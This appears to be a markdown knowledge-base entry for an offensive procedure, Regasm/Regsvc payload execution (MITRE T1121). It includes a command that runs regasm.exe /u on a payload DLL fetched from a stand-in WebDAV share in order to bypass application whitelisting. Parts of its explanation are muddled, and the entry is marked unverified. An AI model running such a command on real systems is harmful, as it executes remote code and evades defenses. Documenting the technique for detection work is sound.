---
id: b9bfd47d-1054-4e9d-a351-7885e39191b5
name: Windows - Regasm / Regsvc Payload Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.932978+00:00'
updated_at: '2023-04-10T20:37:08.176390+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Regsvcs/Regasm|T1121 - Regsvcs/Regasm]]'
tags:
- '[[Regasm / Regsvc @subTee]]'
- '[[Windows - Download and execute methods]]'
commands:
- '[[Unregister payload.dll using regasm.exe]]'
---

# Windows - Regasm / Regsvc Payload Execution

## Summary

Regasm and Regsvc are legitimate Windows utilities that can be used to execute malicious code. Attackers can use these utilities to bypass application whitelisting and execute code with elevated privileges. Regasm is used to register .NET assemblies as COM components, while Regsvc is used to regist

## Description

# Description

Regasm and Regsvc are legitimate Windows utilities that can be used to execute malicious code. Attackers can use these utilities to bypass application whitelisting and execute code with elevated privileges. Regasm is used to register .NET assemblies as COM components, while Regsvc is used to register services. By unregistering a legitimate DLL and replacing it with a malicious one, an attacker can execute arbitrary code on a system. This technique can be used as a part of a larger attack chain, such as a spear-phishing campaign, to gain initial access to a target network.

 

## Requirements

1. Access to a target system

1. Ability to replace a legitimate DLL with a malicious one

 

## Defense

1. Implement application whitelisting to prevent execution of unauthorized binaries

1. Monitor and analyze system logs for suspicious activity related to Regasm and Regsvc usage

1. Regularly update and patch software to prevent vulnerabilities that can be exploited by attackers

 

## Objectives

1. Execute arbitrary code on a target system

1. Bypass application whitelisting

1. Obtain elevated privileges

 

# Instructions

1. To unregister the payload.dll file, run the following command in PowerShell:

 



**Code**: [[C:\Windows\Microsoft.NET\Framework64\v4.0.30319\re]]



> This command unregisters the payload.dll file using the regasm.exe tool located in the specified directory. The /u flag is used to unregister the file, and the file path is specified using the UNC path to the webdavserver and the folder where the file is located.



**Command** ([[Unregister payload.dll using regasm.exe]]):

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Regsvcs/Regasm|T1121 - Regsvcs/Regasm]]

## Commands Used

- [[Unregister payload.dll using regasm.exe]]

## Tags

- [[Regasm / Regsvc @subTee]]
- [[Windows - Download and execute methods]]


